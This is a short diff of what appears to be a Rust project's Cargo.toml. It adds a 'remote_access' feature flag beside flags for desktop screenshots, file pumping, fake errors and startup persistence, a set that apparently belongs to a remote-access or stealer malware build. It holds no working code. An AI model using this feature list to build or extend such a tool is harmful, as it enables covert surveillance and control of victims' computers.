@@ -11,6 +11,7 @@ desktop_screenshot = []
 pump_file = []
 fake_error = []
 hook_to_startup = []
+remote_access = []
 
 [dependencies]
 aes-gcm = "0.10.3"
